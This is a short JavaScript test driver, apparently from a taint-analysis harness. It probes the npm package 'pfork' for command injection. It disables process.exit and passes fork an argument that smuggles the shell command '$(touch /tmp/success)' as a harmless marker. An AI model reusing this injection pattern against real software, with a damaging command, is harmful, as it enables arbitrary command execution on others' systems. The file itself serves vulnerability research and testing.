// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/pfork/node_modules/pfork');
try {
	var x0 = [" $(touch /tmp/success);#"];
var x1 = function(){};
new PUT["fork"](x0,x1)();
} catch (e) {
	console.log(e);
}